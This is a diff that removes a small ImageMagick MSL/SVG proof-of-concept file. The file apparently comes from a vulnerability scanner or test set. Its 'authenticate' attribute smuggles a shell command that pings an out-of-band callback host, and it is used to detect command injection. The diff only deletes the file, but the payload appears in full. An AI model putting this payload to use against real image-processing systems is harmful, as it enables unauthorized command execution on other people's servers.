@@ -1,7 +1,0 @@
-<image authenticate='ff" `ping cnalf28uaek5rr7lu97gsfy4y971fahxs.oast.me`;"'>
-  <get width="base-width" height="base-height" />
-  <resize geometry="400x400" />
-  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
-  <image xlink:href="msl:poc.svg" height="100" width="100"/>
-  </svg>
-</image>
